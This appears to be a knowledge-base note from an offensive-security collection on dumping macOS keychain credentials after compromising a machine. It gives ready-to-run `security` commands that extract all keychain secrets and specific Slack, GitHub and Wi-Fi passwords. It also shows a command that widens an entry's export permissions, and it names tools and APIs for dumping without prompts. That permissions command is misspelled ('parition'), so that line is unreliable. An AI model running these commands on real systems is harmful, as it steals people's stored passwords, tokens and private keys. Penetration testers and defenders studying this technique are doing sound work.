---
title: "macOS Keychain"
type: technique
tags: [macos, keychain, credentials, post-exploitation]
phase: post-exploitation
date_created: 2026-07-14
date_updated: 2026-07-14
sources: [hacktricks-macos]
---

## Keychain dumping

Secrets live in the user keychain `~/Library/Keychains/login.keychain-db` (app/internet passwords, private keys, certs) and the system keychain `/Library/Keychains/System.keychain` (WiFi passwords, root certs). Files are encrypted with the user's login password and can be decrypted offline with Chainbreaker. Each entry has an ACL plus a PartitionID (teamid/apple/cdhash); no-prompt export requires your signature to match the PartitionID. If the PartitionID is `apple`, any Apple-signed interpreter (osascript, python) can reach it.

```bash
security list-keychains
security dump-keychain -a -d                              # all metadata + decrypted secrets (many prompts)
security dump-keychain -d ~/Library/Keychains/login.keychain-db
security find-generic-password -a "Slack" -g             # specific account secret
security find-internet-password -s "github.com" -w       # web password by server
security find-generic-password -s "Wi-Fi" -w             # WiFi password
```

Change an entry's PartitionID to widen who can export it:

```bash
security set-generic-password-parition-list -s "service" -a "account" -S
```

No-prompt dumping tooling and APIs: LockSmith enumerates and dumps without prompts; Chainbreaker decrypts downloaded keychain files offline; the Security framework exposes `SecItemCopyMatching` (with `kSecClassGenericPassword` and `kSecReturnData`), `SecAccessCopyACLList`, `SecKeychainItemCopyContent`, and `SecItemExport`. The unencrypted General field of entries sometimes leaks plaintext tokens. Which keychain groups an app may read is pinned by its `keychain-access-groups` entitlement (see [[macos-code-signing]]).
